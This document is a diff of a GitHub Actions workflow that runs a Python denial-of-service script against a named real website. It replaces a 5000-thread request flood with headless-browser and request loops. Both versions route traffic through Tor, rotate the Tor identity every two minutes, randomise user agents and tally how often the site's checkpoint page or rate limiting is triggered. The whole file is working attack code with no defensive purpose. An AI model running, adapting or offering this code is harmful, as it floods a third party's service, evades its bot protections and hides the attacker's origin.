@@ -1,4 +1,4 @@
-name: 💀 FAST DOS - 5000 THREADS
+name: 💀 SELENIUM + TOR - REAL TIME
 
 on:
   workflow_dispatch:
@@ -15,86 +15,181 @@ jobs:
     
     steps:
       - name: Install
-        run: sudo apt update && sudo apt install -y tor
-        
+        run: |
+          sudo apt update
+          sudo apt install -y tor chromium-browser
+          pip3 install selenium requests[socks] fake_useragent
+          
       - name: Start Tor
         run: sudo systemctl start tor
         
       - name: 🔥 ATTACK
         run: |
-          cat > fast_attack.py << 'EOF'
-          import time, random, requests, threading, subprocess
+          cat > attack.py << 'EOF'
+          import time
+          import random
+          import requests
+          import threading
+          import subprocess
+          from selenium import webdriver
+          from selenium.webdriver.chrome.options import Options
+          from fake_useragent import UserAgent
           
           TARGET = "https://flixtn.com"
           DURATION = ${{ github.event.inputs.duration }} * 60
-          THREADS = 5000
           
-          stats = {"total":0, "ok":0, "fail":0}
+          stats = {"total": 0, "success": 0, "failed": 0, "blocked": 0}
           lock = threading.Lock()
           running = True
           start = time.time()
           
-          def get_session():
-              s = requests.Session()
-              s.proxies = {'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
-              return s
+          def get_chrome_options():
+              opts = Options()
+              opts.add_argument('--headless')
+              opts.add_argument('--no-sandbox')
+              opts.add_argument('--disable-dev-shm-usage')
+              opts.add_argument('--disable-gpu')
+              opts.add_argument('--window-size=1920,1080')
+              opts.add_argument('--proxy-server=socks5://127.0.0.1:9050')
+              opts.add_argument(f'user-agent={UserAgent().random}')
+              return opts
           
-          def worker():
-              s = get_session()
+          def selenium_attack():
+              global running
+              while running:
+                  driver = None
+                  try:
+                      driver = webdriver.Chrome(options=get_chrome_options())
+                      driver.set_page_load_timeout(10)
+                      driver.get(TARGET)
+                      time.sleep(1)
+                      title = driver.title
+                      
+                      with lock:
+                          stats["total"] += 1
+                          if "Checkpoint" in title or "Security" in title:
+                              stats["blocked"] += 1
+                              print("🚫", end="", flush=True)
+                          elif "FlixTN" in title or "FLIXTN" in title:
+                              stats["success"] += 1
+                              print("✅", end="", flush=True)
+                          else:
+                              stats["failed"] += 1
+                              print("⚠️", end="", flush=True)
+                      
+                      driver.quit()
+                      
+                  except Exception:
+                      with lock:
+                          stats["total"] += 1
+                          stats["failed"] += 1
+                      print(".", end="", flush=True)
+                      if driver:
+                          driver.quit()
+                  
+                  time.sleep(random.uniform(1, 3))
+          
+          def curl_attack():
+              global running
+              session = requests.Session()
+              session.proxies = {
+                  'http': 'socks5h://127.0.0.1:9050',
+                  'https': 'socks5h://127.0.0.1:9050'
+              }
+              ua = UserAgent()
+              
               while running:
                   try:
-                      r = s.get(TARGET, timeout=5, headers={'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+                      r = session.get(TARGET, timeout=8, headers={'User-Agent': ua.random})
                       with lock:
                           stats["total"] += 1
                           if r.status_code == 200:
-                              stats["ok"] += 1
+                              stats["success"] += 1
+                              print("✓", end="", flush=True)
+                          elif r.status_code == 429:
+                              stats["blocked"] += 1
+                              print("🔥", end="", flush=True)
                           else:
-                              stats["fail"] += 1
-                      print(f"{r.status_code}", end="", flush=True)
+                              stats["failed"] += 1
+                              print("✗", end="", flush=True)
                   except:
                       with lock:
                           stats["total"] += 1
-                          stats["fail"] += 1
+                          stats["failed"] += 1
                       print(".", end="", flush=True)
-                  time.sleep(random.uniform(0.05, 0.2))
+                  
+                  time.sleep(random.uniform(0.1, 0.5))
           
           def renew_tor():
+              global running
               while running:
                   time.sleep(120)
-                  subprocess.run(["sudo","systemctl","reload","tor"], check=False)
-                  print("\n🔄 Tor IP changed")
+                  subprocess.run(["sudo", "systemctl", "reload", "tor"], check=False)
+                  print("\n🔄 TOR IP CHANGED")
           
-          print(f"💀 ATTACK STARTED - {THREADS} threads")
-          print(f"Target: {TARGET}\n")
+          def printer():
+              global running
+              last_total = 0
+              
+              while running:
+                  time.sleep(1)
+                  elapsed = time.time() - start
+                  
+                  with lock:
+                      total = stats["total"]
+                      success = stats["success"]
+                      failed = stats["failed"]
+                      blocked = stats["blocked"]
+                      rps = total - last_total
+                      last_total = total
+                  
+                  if elapsed >= DURATION:
+                      running = False
+                      break
+                  
+                  mins = int(elapsed // 60)
+                  secs = int(elapsed % 60)
+                  rem = max(0, DURATION - elapsed)
+                  rem_min = int(rem // 60)
+                  rem_sec = int(rem % 60)
+                  
+                  print(f"\n[{mins:02d}:{secs:02d}] Total: {total:>6,} | ✅: {success:>5,} | 🚫: {blocked:>5,} | RPS: {rps:>3} | Remaining: {rem_min}m {rem_sec}s")
+          
+          print("="*55)
+          print("💀 SELENIUM + TOR + CURL - REAL TIME")
+          print(f"Target: {TARGET}")
+          print(f"Duration: ${{ github.event.inputs.duration }} minutes")
+          print("="*55)
+          print("")
+          print("✅ = real page | 🚫 = checkpoint | ✓ = 200 | 🔥 = 429 | . = error")
+          print("")
+          
+          # تشغيل Tor
+          subprocess.run(["sudo", "systemctl", "start", "tor"], check=False)
+          time.sleep(5)
           
           # تشغيل الخيوط
-          for i in range(THREADS):
-              threading.Thread(target=worker, daemon=True).start()
-          
-          # تجديد IP
+          threading.Thread(target=selenium_attack, daemon=True).start()
+          threading.Thread(target=curl_attack, daemon=True).start()
           threading.Thread(target=renew_tor, daemon=True).start()
+          threading.Thread(target=printer, daemon=True).start()
           
-          # إحصائيات كل 10 ثواني
-          last = 0
-          while time.time() - start < DURATION:
-              time.sleep(10)
-              with lock:
-                  total = stats["total"]
-                  ok = stats["ok"]
-                  fail = stats["fail"]
-                  rps = (total - last) / 10
-                  last = total
-              elapsed = int((time.time() - start) / 60)
-              print(f"\n[{elapsed}m] Total: {total:,} | OK: {ok:,} | Fail: {fail:,} | RPS: {rps:.0f}")
+          # انتظار
+          while running:
+              time.sleep(1)
           
-          running = False
-          time.sleep(2)
-          
+          # النتيجة
           elapsed = time.time() - start
-          print(f"\n\n✅ FINAL: {stats['total']:,} requests in {int(elapsed//60)}m")
-          print(f"   Success: {stats['ok']:,} | Failed: {stats['fail']:,}")
+          print("\n" + "="*55)
+          print("FINAL RESULTS:")
+          print(f"  Time: {int(elapsed//60)}m {int(elapsed%60)}s")
+          print(f"  Total: {stats['total']:,}")
+          print(f"  Success: {stats['success']:,}")
+          print(f"  Failed: {stats['failed']:,}")
+          print(f"  Blocked: {stats['blocked']:,}")
           if stats['total'] > 0:
-              print(f"   Success rate: {stats['ok']/stats['total']*100:.1f}%")
+              print(f"  Rate: {stats['success']/stats['total']*100:.1f}% success")
+          print("="*55)
           EOF
           
-          python3 fast_attack.py
+          python3 attack.py
